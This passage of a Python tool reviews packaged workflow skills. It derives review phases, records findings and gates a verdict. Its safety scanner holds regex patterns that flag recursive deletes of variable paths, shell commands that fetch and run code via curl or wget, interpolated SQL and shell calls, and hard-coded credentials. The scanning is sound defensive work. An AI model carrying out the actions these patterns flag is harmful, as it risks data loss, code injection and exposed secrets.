#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Clearlane
"""Coordinator for reviewing a workflow skill.

Review phases follow the surfaces the reviewed skill actually exposes, so a
skill with no settings never walks a settings review. The surface vocabulary is
imported from the design coordinator rather than restated, so a capability can
never be designable but unreviewable. Findings, dispositions, and phase notes
persist in a run directory, and the verdict is gated on every blocking finding
carrying an explicit disposition.
"""

import argparse
import json
import re
import sys
from pathlib import Path, PurePosixPath

sys.path.insert(0, str(Path(__file__).resolve().parent))

import document
import names
import neutrality
from cli import (
    EX_DATAERR,
    EX_USAGE,
    Failure,
    fail,
)
from design import CAPABILITY_PHASES
from state import (
    VERSION,
    create_run,
    excluded,
    ignored,
    ignored_prefixes,
    now,
    open_run,
    pending_phase,
    phase_complete_event,
    read_artifact,
    read_history,
    read_json,
    read_status,
    relative_file_manifest,
    require_text,
    run_cli,
    save_state,
    slug,
    tree_sha256,
    validate_sarif,
    write_artifact,
    write_json,
)
from state import (
    print_status as print_envelope,
)
from validate import RULES
from validate import validate as validate_skill

# Review concerns every skill has, regardless of which surfaces it exposes.
ALWAYS_FIRST = ("activation", "structure")
ALWAYS_LAST = ("safety", "verdict")

# SARIF 2.1.0 has three result levels. Ours map onto them without loss: a
# reviewer's "this blocks the merge" is a scanner's "error".
SARIF_LEVELS = {"blocking": "error", "major": "warning", "minor": "note"}
SARIF_SCHEMA = "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json"
# Identifies which tool produced a result once the file has left this run
# directory, and gives each rule a page explaining what it checks.
TOOL_NAME = "designing-workflow-skills review"
HELP_BASE = "https://github.com/clearlane/workflow-skills/blob/main"
PHASE_RESOURCES = {
    "activation": "references/structure.md",
    "structure": "references/naming.md",
    "safety": "references/patterns.md#6-safety-gate",
    "verdict": "references/review.md",
}

# Surfaces mirror the design coordinator's capabilities: whatever can be
# designed must be reviewable against the same contract.
SURFACES = tuple(name for name, _, _ in CAPABILITY_PHASES)
SURFACE_RESOURCES = {name: resource for name, _, resource in CAPABILITY_PHASES}
# Suffixes that make a bare string look like a filename. This is a naming
# question, so an allowlist is the right shape: it decides whether `--evidence
# design.md` cites a file or is prose, and over-reading prose as a path would
# reject a legitimate citation.
TEXT_SUFFIXES = {".md", ".py", ".js", ".mjs", ".ts", ".sh", ".json", ".yaml", ".yml", ".toml"}
# Suffixes that are certainly not text, used to skip the obvious before paying
# to decode. Anything not named here is decided by reading it, not by whether
# this list anticipated it.
BINARY_SUFFIXES = {
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".webp",
    ".ico",
    ".bmp",
    ".tiff",
    ".pdf",
    ".zip",
    ".gz",
    ".bz2",
    ".xz",
    ".tar",
    ".7z",
    ".rar",
    ".jar",
    ".woff",
    ".woff2",
    ".ttf",
    ".otf",
    ".eot",
    ".mp3",
    ".mp4",
    ".wav",
    ".ogg",
    ".webm",
    ".mov",
    ".avi",
    ".so",
    ".dylib",
    ".dll",
    ".exe",
    ".bin",
    ".o",
    ".a",
    ".class",
    ".pyc",
    ".wasm",
    ".db",
    ".sqlite",
    ".sqlite3",
}
MAX_EVIDENCE = 5
MAX_BYTES = 2_000_000

SEVERITIES = ("blocking", "major", "minor")
DISPOSITIONS = ("fixed", "accepted", "deferred")
# `not-applicable` is a real answer, not an escape hatch: a skill with no
# destructive action genuinely cannot gate one. It still costs evidence, so
# the claim that the case does not arise is on the record and checkable.
VERDICTS = ("holds", "violated", "not-applicable")

# The contract every phase is reviewed against. Its questions are parsed rather
# than restated here, because a copy is a second place to change and the
# failure mode is silent: prose gains a question, the coordinator keeps gating
# on the old list, and the run reports full coverage of a contract it no longer
# matches.
REVIEW_CONTRACT = Path(__file__).resolve().parent.parent / "references" / "review.md"


def contract_bullets(text=None):
    """Every bullet the contract's question sections hold, before filtering.

    Surface phases share one list, and `coordinator` and `state` carry a
    second, exactly as the document says. That is read off the two bullet
    lists under the surface heading rather than hardcoded, so adding a question
    to either is a documentation edit the gate picks up.

    This is where the mapping from document location to phase lives, and it
    lives here once. `parse_questions` narrows the result to what a reviewer
    can answer, and `check.py` compares the two to find the rules that fell
    through; neither restates where a question section is.

    Markdown is parsed by `document.py`, which owns the model for this
    repository. An earlier version sliced the text by hand and had to decide
    for itself what separated two lists, which is CommonMark's job.
    """
    parsed = document.parse(REVIEW_CONTRACT, text)
    bullets = {}
    for heading in parsed.headings_at(3):
        items = [item for group in parsed.section_lists(heading.text, level=3) for item in group]
        if items:
            bullets[heading.text] = items

    blocks = [group for group in parsed.section_lists("Surface Phases") if group]
    shared = blocks[0] if blocks else []
    delegating = blocks[1] if len(blocks) > 1 else []
    for surface in SURFACES:
        # The two phases that own what every other surface delegates answer for
        # ordering, resumability, and concurrency as well.
        items = shared + (delegating if surface in ("coordinator", "state") else [])
        if items:
            bullets[surface] = items
    return bullets


def parse_questions(text=None):
    """Extract each phase's review questions from the contract document.

    Returns a mapping of phase name to the questions that phase must answer.
    Only interrogative bullets count: the contract also uses bullets for the
    disposition vocabulary and the evidence ranking, which are statements, and
    treating those as questions would demand answers to things that ask
    nothing.

    That filter reads shape, not location, so on its own it cannot tell a
    statement that belongs outside the question set from a rule someone wrote
    into a question section as a statement. `check.py` settles which one a
    dropped bullet is, against the sections `contract_bullets` harvests.
    """
    return {
        phase: asked
        for phase, items in contract_bullets(text).items()
        if (asked := [item for item in items if item.endswith("?")])
    }


def phase_questions(phase, contract=None):
    """Return `(id, text)` for each question the phase must answer."""
    asked = parse_questions(contract).get(phase, [])
    return [(f"{phase}.{index}", text) for index, text in enumerate(asked, start=1)]


# The prefix marking a source as a conformance rule validate.py owns, rather
# than a scan this coordinator runs or a reviewer's own note. Named once
# because it is the string both the writer and the resolver depend on, and two
# spellings of it would put a finding beyond the reach of its own anchor.
CONFORMANCE_PREFIX = "conformance:"

# Which contract question each automatic finding already answers, keyed by the
# finding's source. Anchored on a distinctive phrase rather than an index, so
# reordering the prose cannot silently remap an answer onto a different
# question; `check.py` fails when an anchor stops resolving.
ANSWER_ANCHORS = {
    "conformance:description": ("activation", "observable user intent"),
    "conformance:name": ("activation", "observable user intent"),
    "conformance:frontmatter": ("activation", "observable user intent"),
    # The activation metadata a host reads, bounded by the same format rule as
    # the fields above. Missing here until the rule set stopped being read by
    # pattern: this name is built from the field it bounds rather than written
    # out, so nothing saw it, and the finding it seeded settled nothing.
    "conformance:compatibility": ("activation", "observable user intent"),
    "conformance:size": ("structure", "size stay within budget"),
    "conformance:links": ("structure", "every resource reachable"),
    "structure:unreachable": ("structure", "every resource reachable"),
    "structure:naming": ("structure", "filenames follow"),
    "structure:neutrality": ("structure", "name capabilities rather than a host"),
    "structure:portability": ("structure", "contain every file it reads"),
    "structure:layout": ("structure", "every resource reachable"),
    "safety-scan": ("safety", "no raw shell interpolation"),
}

# `structure` fires only for a directory holding no SKILL.md, which `init`
# refuses before a run exists, so it can never reach findings.json. Anchoring
# it would state a mapping nothing can exercise; naming it here instead keeps
# the coverage check honest about why it is absent.
UNREACHABLE_RULES = {"conformance:structure"}


def anchored_question(source, contract=None):
    """Resolve a finding source to the question id it answers, if any.

    A source this run generated must be mapped. Returning None for anything
    unrecognised conflated two opposite situations: a reviewer's hand-recorded
    finding, which legitimately answers nothing and carries no source at all,
    and a rule whose name no longer matches its anchor, which answers nothing
    only because the mapping rotted. The second reads as the first, so a
    renamed rule left the run demanding a hand-written answer to a question it
    had already settled, and every gate still closed.

    So only an unsourced finding is silent. A `conformance:` source names a
    rule validate.py owns, and one outside that vocabulary is a typo or a
    rename; either way the string resolves to nothing and saying so is the
    only honest answer.
    """
    if not source:
        return None
    rule = source.partition(":")[2] if source.startswith(CONFORMANCE_PREFIX) else None
    if rule is not None and rule not in RULES:
        raise AssertionError(f"source {source!r} names no rule validate.py can emit")
    if source not in ANSWER_ANCHORS:
        # An unanchored generated source is the same rot seen from the other
        # side: check.py rejects the mapping, and a run that somehow holds one
        # must not quietly treat it as a reviewer's own note.
        if rule is not None and source not in UNREACHABLE_RULES:
            raise AssertionError(f"source {source!r} is generated but anchors to no contract question")
        return None
    phase, needle = ANSWER_ANCHORS[source]
    for identifier, text in phase_questions(phase, contract):
        if needle in text:
            return identifier
    raise AssertionError(f"anchor {needle!r} no longer matches any {phase} question")


def derive_phases(surfaces):
    """Return only the review phases this skill's own surfaces require."""
    selected = list(ALWAYS_FIRST)
    selected.extend(name for name in SURFACES if name in surfaces)
    selected.extend(ALWAYS_LAST)
    return selected


def phase_resource(phase):
    return SURFACE_RESOURCES.get(phase) or PHASE_RESOURCES[phase]


def readable_lines(path):
    """The file's lines if it is text this scan can read, otherwise None.

    Scanning was keyed on an allowlist of ten suffixes, which is the wrong
    default for a question about what a skill ships: a `.ps1`, `.php`, `.rb`,
    `.bats`, `.sql`, `.env`, or `.ini` file was not partially scanned but
    entirely unscanned, and a credential or an interpolated shell call in one
    was invisible to the phase that exists to find it. Being an unanticipated
    suffix should never be what exempts a file from a safety scan.

    Membership is decided by decoding instead. A NUL byte is the same signal
    git uses to call a blob binary, and it costs one bounded read rather than a
    list that has to keep up with every language a skill might ship.
    """
    if path.suffix.lower() in BINARY_SUFFIXES:
        return None
    try:
        if path.stat().st_size > MAX_BYTES:
            return None
        raw = path.read_bytes()
    except OSError:
        return None
    if b"\0" in raw:
        return None
    try:
        return raw.decode("utf-8").splitlines()
    except UnicodeDecodeError:
        return None


# Directories whose contents describe a concept rather than implement it. A
# skill that explains what a settings adapter is does not thereby have one, and
# this is the distinction the keyword scan could not make.
DOCUMENTATION_DIRS = frozenset({"references", "reference", "docs", "doc", "guides", "knowledge"})


def surface_evidence(relative):
    """The surfaces a single path is evidence for, by what it is rather than what it says.

    A surface is a component the skill exposes, and each one costs a whole
    review phase of questions about a thing that must exist to be answerable.
    Detection therefore has to be about the artifact, and a name is the
    artifact's own claim about what it is: `scripts/settings.py` is a settings
    adapter, `workflows/setup.md` is a setup workflow.

    Reading a keyword out of any line of any file was the previous rule, and it
    could not tell a component from a sentence. Across the author's corpus 917
    of 1021 signals were a word inside prose, and the resulting phases were
    demanded of skills that had no such component at all: `The Anglo-Saxon
    Preference` in a writing guide raised a settings surface, `don't bundle
    unrelated edits` in a contributing guide raised packaging, and `hooks` in
    social media advice raised events. 433 surface phases were demanded across
    119 skills while only 31 of them ship an executable of any kind, and each
    false phase is three questions a reviewer must answer about something that
    is not there. Under-detection is the recoverable direction: `add-surface`
    exists precisely because a surface can be noticed late, and it re-baselines
    the run. There is no corresponding way to withdraw a phase once a reviewer
    has been sent to answer for it.

    Documentation about a surface is excluded for the same reason. This
    repository's own `references/packaging.md` is a contract describing
    packaging, not a bundle the skill ships.
    """
    stem = relative.stem.lower()
    directories = {part.lower() for part in relative.parts[:-1]}
    if directories & DOCUMENTATION_DIRS:
        return ()
    return tuple(
        name for name in SURFACES if stem == name or stem.startswith((f"{name}-", f"{name}_")) or name in directories
    )


def detect_surfaces(skill_root):
    """Collect bounded file evidence for each surface the skill exposes."""
    evidence = {name: [] for name in SURFACES}
    for _, relative in own_files(skill_root):
        for name in surface_evidence(relative):
            hits = evidence[name]
            if len(hits) < MAX_EVIDENCE:
                hits.append({"path": relative.as_posix(), "line": 0, "signal": "filename"})
    return evidence


def nested_skill_roots(skill_root):
    """Directories inside a skill that are themselves skills.

    A skill is a directory containing SKILL.md, so a subdirectory containing
    one is a different skill that happens to live here. Vendoring is why they
    are here at all: a host installs the skills a project depends on into a
    project-local directory, and a checkout of one skill therefore carries
    copies of others.

    Measured on the author's corpus, 267 of 545 surface-evidence hits pointed
    into a vendored copy. `chronologie` ships one SKILL.md and no scripts, and
    was reported as exposing a coordinator, settings, install, workers and
    packaging; five of those six came from two other people's skills. That is
    worse than a false positive. The reviewer is shown a real file containing
    a real signal, so reading the evidence confirms it, and the surface belongs
    to someone else. Vendored copies are also mostly identical across skills,
    so the same wrong answer arrives for every skill in a corpus.

    Found by the marker file rather than by listing the directory names hosts
    use, because that list is open-ended and a host nobody has heard of still
    installs a skill the same way: as a directory with a SKILL.md in it.
    """
    return {
        path.parent
        for path in skill_root.rglob("SKILL.md")
        if path.parent != skill_root and not excluded(path.relative_to(skill_root).parts)
    }


def own_files(skill_root):
    """Every file that belongs to this skill rather than to one nested inside it.

    A skill's own ignore rules decide what is content, because it already
    declares that boundary and guessing at directory names cannot keep up with
    it. Run state is the case that motivated this: a coordinator writes its
    analyses under a run directory the skill gitignores, and reviewing those as
    though they were guidance reports the workflow's own transcripts back as
    findings about the skill.
    """
    nested = nested_skill_roots(skill_root)
    prefixes = ignored_prefixes(skill_root)
    for path in sorted(skill_root.rglob("*")):
        relative = path.relative_to(skill_root)
        if not path.is_file() or excluded(relative.parts):
            continue
        if ignored(relative.as_posix(), prefixes):
            continue
        if any(path.is_relative_to(other) for other in nested):
            continue
        yield path, relative


def load_findings(root):
    path = root / "findings.json"
    if not path.exists():
        return []
    return read_artifact(path, "findings.schema.json").get("findings", [])


def save_findings(root, findings):
    write_artifact(root / "findings.json", "findings.schema.json", {"findings": findings})


def unresolved_blocking(findings):
    return [item["id"] for item in findings if item["severity"] == "blocking" and not item["disposition"]]


def load_answers(root):
    path = root / "answers.json"
    if not path.exists():
        return {}
    return read_artifact(path, "answers.schema.json").get("answers", {})


def save_answers(root, answers):
    write_artifact(root / "answers.json", "answers.schema.json", {"answers": answers})


def answered_by_findings(findings):
    """Question ids a seeded finding already settles.

    A scan that located a defect has answered its question in the only way
    that matters: with evidence. Asking the reviewer to retype an answer the
    run already holds is how a gate becomes a formality people click through.
    """
    answered = {}
    for item in findings:
        identifier = anchored_question(item.get("source", ""))
        if identifier:
            answered.setdefault(identifier, item["id"])
    return answered


def outstanding_questions(root, phase, findings=None):
    """Questions this phase must still answer before it can close.

    An id is positional, so editing the contract mid-run can move it onto a
    different question. An answer therefore only settles the question it was
    recorded against: `answers.json` stores the text as asked, and an id whose
    text has since changed is asked again. Without that, reordering two
    questions would silently retarget an answer, and the phase would close
    reporting full coverage over a question nobody was ever shown.
    """
    findings = load_findings(root) if findings is None else findings
    # Keyed by id and text together. The schema requires an answer to record
    # the question it was given, so there is no answer without one to compare.
    settled = set(answered_by_findings(findings))
    asked_as = {(identifier, answer["question"]) for identifier, answer in load_answers(root).items()}
    return [
        (identifier, text)
        for identifier, text in phase_questions(phase)
        if identifier not in settled and (identifier, text) not in asked_as
    ]


def print_status(root, state):
    phase = pending_phase(state)
    findings = load_findings(root)
    blocking = unresolved_blocking(findings)
    outstanding = outstanding_questions(root, phase, findings) if phase else []
    if phase == "verdict" and blocking:
        action = "Resolve blocking findings before the verdict: " + ", ".join(blocking) + " (use resolve-finding)."
    elif outstanding:
        # Naming the next question, rather than only the phase, means the gate
        # tells the agent what it is waiting for. A gate that refuses without
        # saying what would satisfy it gets worked around instead of answered.
        action = (
            f"Answer the open '{phase}' questions against {phase_resource(phase)}: "
            + "; ".join(f"{identifier} {text}" for identifier, text in outstanding)
            + " (use answer, then complete-phase)."
        )
    elif phase:
        action = (
            f"Review '{phase}' against {phase_resource(phase)}, record findings, then run "
            f"complete-phase --phase {phase} with a decision note."
        )
    else:
        action = f"Review complete. Report written to {root / 'report.md'}."
    print_envelope(
        "review",
        root,
        phase,
        state["phases"],
        state["completed"],
        phase_resource(phase) if phase else None,
        action,
        {
            "skill": state["skill"],
            "surfaces": state["surfaces"],
            "findings": {"total": len(findings), "blocking_unresolved": blocking},
            "questions": {
                "open": [{"id": identifier, "text": text} for identifier, text in outstanding],
                "answered": len(load_answers(root)),
            },
        },
    )


# Shapes the safety phase asks about that a pattern can locate. Each is a lead,
# never a verdict: whether an interpolation is safe depends on where the value
# came from, which only a reader can decide. They are seeded as `major` rather
# than `blocking` for exactly that reason, so the run does not stall on a
# scanner's opinion, and every one names the question it is evidence for.
SAFETY_PATTERNS = (
    (
        # Recursive only. A plain `rm -f "$tmp"` removes one named file and is
        # the ordinary spelling of a cleanup trap, so flagging it buried the
        # recursive case that actually loses a tree. An unquoted variable is
        # included whether recursive or not, since word splitting turns one
        # path into several.
        re.compile(r"\brm\s+(?:-[a-z]*\s+)*-?[a-z]*r[a-z]*\s+[\"']?\$|\brm\s+(?:-[a-z]+\s+)*\$[A-Za-z_{]"),
        "deletes recursively, or without quoting, a path built from a variable",
        "quote and validate the path before deleting, or confine the delete to a restorable snapshot",
    ),
    (
        re.compile(r"\b(?:eval|sh|bash)\b[^\n]*\$\((?:\s*)?(?:curl|wget)\b"),
        "executes code fetched at runtime",
        "pin and verify what is fetched, or install it as a declared dependency instead",
    ),
    (
        # Anchored on SQL grammar, not on the bare verb: `agents update --id
        # "$X"` is a CLI invocation, and matching it made every command line
        # carrying the word "update" a database finding.
        re.compile(
            r"\b(?:SELECT\b[^\n]*\bFROM\b|INSERT\s+INTO\b|UPDATE\b[^\n]*\bSET\b|DELETE\s+FROM\b)"
            r"[^\n]*(?:'\s*\$|\"\s*\$|\$\{|%s\s*%|\+\s*\w+)",
            re.IGNORECASE,
        ),
        "builds a query by interpolating a value",
        "pass the value as a bound parameter rather than concatenating it into the statement",
    ),
    (
        re.compile(
            r"\b(?:api[_-]?key|secret|token|password|passwd)\b\s*[:=]\s*[\"']?[A-Za-z0-9_\-]{16,}",
            re.IGNORECASE,
        ),
        "looks like a literal credential",
        "read the secret from the environment or a secret store, and rotate this one if it is real",
    ),
    # The four patterns above are shell-shaped, so they see a dangerous command
    # only when it is written in shell. The same command built in Python or
    # JavaScript and handed to a shell was invisible: `os.system("rm -rf " +
    # target)` matched nothing, which is the exact line the safety phase exists
    # to find. These read the language-level spelling of the same act.
    (
        # A literal argument is fine; the finding is the interpolation.
        re.compile(r"\bos\.(?:system|popen)\s*\(\s*(?:[\"'][^\"']*[\"']\s*(?:\+|%)|f[\"']|[A-Za-z_])"),
        "builds a shell command from a value and runs it",
        "pass an argument list to subprocess.run without a shell, or validate and quote the value first",
    ),
    (
        # shell=True is only a finding when the command on that line is built
        # rather than literal, since a fixed string carries nothing to inject.
        re.compile(
            r"(?:f[\"'][^\"']*\{|[\"'][^\"']*[\"']\s*\+|%\s*[A-Za-z_(])[^\n]*shell\s*=\s*True"
            r"|shell\s*=\s*True[^\n]*(?:f[\"'][^\"']*\{|[\"'][^\"']*[\"']\s*\+)"
        ),
        "runs an interpolated command through a shell",
        "drop shell=True and pass an argument list, so the value cannot be read as syntax",
    ),
    (
        re.compile(r"\b(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{|[\"'][^\"']*[\"']\s*\+|[A-Za-z_$][\w$]*\s*\+)"),
        "builds a shell command from a value and runs it",
        "use execFile or spawn with an argument array, or escape the value for the shell",
    ),
    (
        # A bare name as the whole argument. `exec(compile(...))` and a
        # commented line are excluded, since a call and a mention differ.
        re.compile(r"(?<![\w.])(?:eval|exec)\s*\(\s*[A-Za-z_$][\w$]*\s*[,)]"),
        "evaluates a value as code",
        "parse the value with a format that carries no execution, such as json",
    ),
    (
        re.compile(r"\bshutil\.rmtree\s*\(\s*(?![\"'])[A-Za-z_]"),
        "deletes a tree at a path held in a variable",
        "confine the delete to a path the code created, or take a restorable snapshot first",
    ),
)


def require_evidence(value, skill_root):
    """A path cited as evidence must resolve inside the reviewed skill.

    review.md says every finding cites a path, or a path and line, inside the
    reviewed skill, and the coordinator rejects a claim without one. It
    rejected only an empty string: `--evidence does/not/exist.md:9999` was
    accepted and recorded, so the report carried a citation pointing nowhere.
    That is worse than no citation, because a reader who does not follow it
    reads a defect as established, and a remediation run triages against it.

    A command and its result is also legitimate evidence and cannot be
    resolved as a path, so only values shaped like a path are checked. The
    test is deliberately narrow: something with a slash or a known text
    suffix, optionally followed by a line number, is a path claim.
    """
    require_text(value, "--evidence")
    candidate = value.strip()
    location, separator, line = candidate.rpartition(":")
    if separator and line.isdigit():
        candidate = location
    else:
        line = ""
    looks_like_path = "/" in candidate or Path(candidate).suffix.lower() in TEXT_SUFFIXES
    if not looks_like_path or " " in candidate:
        return
    if Path(candidate).is_absolute() or ".." in Path(candidate).parts:
        fail(f"--evidence must stay inside the reviewed skill: {value}", EX_DATAERR)
    target = skill_root / candidate
    if not target.is_file():
        fail(f"--evidence names {candidate}, which does not exist in the reviewed skill", EX_DATAERR)
    if line:
        # A line past the end of the file is a citation a reader cannot follow,
        # and is the shape a stale finding takes after the file shrinks.
        try:
            length = len(target.read_text(errors="replace").splitlines())
        except OSError:
            return
        if int(line) < 1 or int(line) > length:
            fail(f"--evidence names {candidate}:{line}, which has {length} lines", EX_DATAERR)


def safety_findings(skill_root):
    """Locate the safety questions a pattern can find, as leads to settle.

    The safety phase asks whether external input reaches a shell unvalidated
    and whether secrets stay out of the tree. A reviewer answers those by
    reading, and a reviewer who does not read carefully answers them by
    assuming. Pointing at the lines first means the reading starts somewhere
    specific, which is the same reason the format checks are seeded.

    Deliberately not a security scanner. It reports shapes, and a shape is not
    a defect: a recursive delete of a quoted snapshot path, inside the
    coordinator that created that snapshot, is correct. Recorded as `major`, so
    it must be dispositioned and argued with rather than silently inherited as
    a blocking obligation.
    """
    findings = []
    for path, relative in own_files(skill_root):
        lines = readable_lines(path)
        if lines is None:
            continue
        for number, line in enumerate(lines, 1):
            # A commented line is a description of code, not code. Reporting
            # one sends a reviewer to read a sentence about a risk instead of
            # the risk, and the most common such sentence is the note left
            # where someone already decided against the dangerous call.
            if line.lstrip().startswith(("#", "//")):
                continue
            for pattern, summary, remedy in SAFETY_PATTERNS:
                if not pattern.search(line):
                    continue
                findings.append(
                    {
                        "phase": "safety",
                        "severity": "major",
                        "summary": f"{relative.as_posix()}:{number} {summary}",
                        "evidence": f"{relative.as_posix()}:{number}",
                        "remedy": remedy,
                        "disposition": None,
                        "disposition_note": None,
                        "source": "safety-scan",
                        "recorded_at": now(),
                    }
                )
                break
    return findings


# Directories whose prose is a resource an agent is meant to reach. Executables
# and data are excluded on purpose: a script is reached by being run, not by
# being named, so reporting it unreferenced would be noise. Naming is checked
# across the whole tree by names.py, which owns that rule.
RESOURCE_DIRS = frozenset(
    {"references", "reference", "workflows", "docs", "doc", "guides", "lib", "commands", "agents"}
)


def naming_findings(skill_root):
    """Flag filenames outside the one-word or family-first convention.

    `references/naming.md` states the rule and a reviewer was left to apply
    it by eye across every file in the tree, which is the kind of uniform
    mechanical sweep attention is worst at: one `SCREAMING_CASE.md` among
    thirty conforming names reads as unremarkable.

    scripts/names.py owns the rule, including the PEP 8 carve-out for
    importable modules and the ecosystem names that outrank the convention, and
    self-checks nineteen cases against it. This used to restate a subset of
    that: a stem pattern, a stem allowlist, and `*.md` under four directory
    names. The subset was the problem. A skill keeping its resources in `lib/`
    or its executables in `bin/` was not partially checked but entirely
    unchecked, and a `HelperUtils.md` there passed while the same file one
    directory over failed. Two implementations of one rule also drift, and the
    one being maintained was not this one.
    """
    findings = []
    # A vendored copy is someone else's skill, and its filenames are their
    # convention to keep. Measured on the author's corpus, 25 of 120 naming
    # findings named a file inside a bundled dependency, which asks an author
    # to rename a file they do not own and cannot change without the change
    # being erased on the next install.
    # Directories included, because the convention governs them too and a
    # directory is never itself a file: comparing against files alone silently
    # dropped every directory finding the rule produced.
    own = set()
    for _, relative in own_files(skill_root):
        own.add(relative.as_posix())
        for depth in range(1, len(relative.parts)):
            own.add("/".join(relative.parts[:depth]))
    for relative, error in names.validate(skill_root):
        if excluded(relative.parts) or relative.as_posix() not in own:
            continue
        findings.append(
            {
                "phase": "structure",
                "severity": "minor",
                "summary": f"{relative.as_posix()} is outside the filename convention: {error}",
                "evidence": relative.as_posix(),
                "remedy": error,
                "disposition": None,
                "disposition_note": None,
                "source": "structure:naming",
                "recorded_at": now(),
            }
        )
    return findings


# The destinations references/structure.md routes material to. `workflows/` is
# here because this repository and twelve other skills ship one, and a table
# that omits the directory its own owner uses cannot be the single structure it
# claims to be. Component directories such as `agents/` stay out: packaging.md
# reserves those for the host to scan, so they are a different contract's.
ROUTED_DIRS = ("scripts", "references", "examples", "assets", "workflows")

# Nouns the routing table's own Material column uses, mapped to the destination
# that column assigns them. A directory named for the material it holds has
# already answered the routing question; it just wrote the answer as a
# directory name instead of following the route. Every entry here is a word
# structure.md itself uses, so the rule stays the table's opinion rather than
# mine: `docs/` is deliberately absent because the table never says "docs".
ROUTED_MATERIAL = {
    "knowledge": "references",
    "schema": "references",
    "schemas": "references",
    "template": "assets",
    "templates": "assets",
    "boilerplate": "assets",
    "media": "assets",
    "sample": "examples",
    "samples": "examples",
}


def misrouted_directory(name):
    """The destination this directory name was reaching for, if it missed.

    references/layout.md is explicit that layout follows evidence rather than a
    universal folder template, so a check cannot ask whether a tree is ideal.
    It can ask two narrower questions that have one right answer each, both
    decided by the routing table rather than by taste.

    A directory named `reference/` is not an alternative convention, it is
    `references/` with a letter missing, and every route written against the
    documented name misses it. A directory named `schemas/` is the second
    shape: the table routes decision tables and schemas to `references/`, so
    the name states material the table has already placed. Both leave the
    files where nothing looks; neither requires deciding what an ideal tree is.
    """
    lowered = name.lower()
    for destination in ROUTED_DIRS:
        if lowered in (destination.rstrip("s"), destination + "s"):
            return destination
    return ROUTED_MATERIAL.get(lowered)


def layout_findings(skill_root):
    """Name a top-level directory the routing table already has a home for.

    A misrouted directory is worse than an unconventional one. The skill's own
    guidance, its README, and any host convention all say `references/`, so
    every reader and every route written from memory looks in a directory that
    does not exist, while the files sit one letter away being found by nothing.

    Only the skill root is examined. The table routes material into a skill,
    not within one: `references/templates/` is a reference directory organising
    itself, and reporting it would turn a routing rule into an opinion about
    how deep a tree may nest, which layout.md refuses to hold.
    """
    findings = []
    seen = set()
    for _, relative in own_files(skill_root):
        if len(relative.parts) < 2:
            continue
        directory = relative.parts[0]
        if directory in seen:
            continue
        seen.add(directory)
        destination = misrouted_directory(directory)
        if destination is None:
            continue
        findings.append(
            {
                "phase": "structure",
                "severity": "minor",
                "summary": (
                    f"{directory}/ holds material references/structure.md routes to "
                    f"{destination}/; material routed there will not be found"
                ),
                "evidence": directory,
                "remedy": f"move {directory}/ into {destination}/",
                "disposition": None,
                "disposition_note": None,
                "source": "structure:layout",
                "recorded_at": now(),
            }
        )
    return findings


def portability_findings(skill_root):
    """Report a symlink whose target the skill does not contain.

    A skill is distributed by copying its directory, so a link out of the tree
    resolves to nothing on the machine that receives it: the content is simply
    absent, and the failure appears at the moment an agent reads the file
    rather than at install time.

    state.relative_file_manifest used to refuse to build a manifest at all when
    it found one, which stopped `init` before a run existed. That turned one
    portability defect into a review that never happened: 21 of 198 skills in
    the author's corpus aborted there and were checked for nothing, and 17 of
    them aborted on a link a host had created to install a dependency, which is
    the host's own bookkeeping rather than a defect in the skill. Refusing also
    reported it to whoever ran the tool instead of into the findings the review
    exists to produce.

    Links a host manages are excluded on the same ownership boundary the other
    finders use, since a skill cannot answer for how its dependencies were
    installed.
    """
    findings = []
    nested = nested_skill_roots(skill_root)
    prefixes = ignored_prefixes(skill_root)
    for path in sorted(skill_root.rglob("*")):
        if not path.is_symlink():
            continue
        relative = path.relative_to(skill_root)
        if excluded(relative.parts) or ignored(relative.as_posix(), prefixes):
            continue
        if any(path.is_relative_to(other) for other in nested):
            continue
        destination = path.resolve()
        # A link pointing at another skill is a dependency the host installed,
        # not content this skill authored.
        if destination.is_dir() and (destination / "SKILL.md").is_file():
            continue
        if destination.is_relative_to(skill_root):
            continue
        findings.append(
            {
                "phase": "structure",
                "severity": "major",
                "summary": (
                    f"{relative.as_posix()} is a symlink to {destination}, which is outside the skill; "
                    "copying the skill leaves it dangling"
                ),
                "evidence": relative.as_posix(),
                "remedy": "move the content inside the skill, or generate it during setup rather than linking to it",
                "disposition": None,
                "disposition_note": None,
                "source": "structure:portability",
                "recorded_at": now(),
            }
        )
    return findings


def neutrality_findings(skill_root):
    """Point at the host-owned paths in a skill's core guidance.

    The structure phase asks whether core guidance names capabilities rather
    than one host's own paths. A reviewer answers that by reading every
    document for a path shape, which is the uniform mechanical sweep attention
    is worst at: one `~/.windsurf/` among forty neutral paragraphs reads as
    unremarkable, and the cost of missing it is a skill whose state cannot move
    to another runtime without migrating live user data.

    `neutrality.py` owns both the shapes and the scope, so this reports what
    that module finds rather than restating it. Scope matters as much as shape:
    scanning every file reported this repository's own README, whose install
    section has to name the directory each host scans. That is the document
    doing its job, and a finding against it would argue with the one place the
    information belongs.

    Recorded as `major`, and against the same allowlist reasoning the module
    documents, because a shape is evidence rather than a verdict. A skill may
    have a considered reason to name a host in core guidance, and `accepted`
    with a note is how that is said.
    """
    findings = []
    for path, relative in own_files(skill_root):
        if path.suffix != ".md":
            continue
        # The scope is owned by neutrality.py, so the checker and the reviewer
        # cannot disagree about which documents the rule governs.
        if not neutrality.is_core_guidance(relative) or path.stat().st_size > MAX_BYTES:
            continue
        try:
            lines = path.read_text(errors="replace").splitlines()
        except OSError:
            continue
        # A settings reference names a host's install path once and its home
        # directory on many lines, so corroboration is gathered per document
        # rather than per line. Read from this document alone: a host named in
        # a neighbouring file has not been named here.
        corroborating = {match.group(1) for line in lines for match in neutrality.HOST_INSTALL_PATH.finditer(line)}
        for number, line in enumerate(lines, 1):
            for host in neutrality.host_paths(line, extra_hosts=corroborating):
                findings.append(
                    {
                        "phase": "structure",
                        "severity": "major",
                        "summary": f"{relative.as_posix()}:{number} names the host-owned path {host}",
                        "evidence": f"{relative.as_posix()}:{number}",
                        "remedy": "name the capability and move the path into a host adapter",
                        "disposition": None,
                        "disposition_note": None,
                        "source": "structure:neutrality",
                        "recorded_at": now(),
                    }
                )
    return findings


def collective_route(directory):
    """Match a route reaching a directory's members rather than one named file.

    A link to `references/linked.md` names that file, and reading it as a route
    to the directory would exempt every sibling from the reachability rule: one
    link would silence a whole directory, which is the opposite of what this
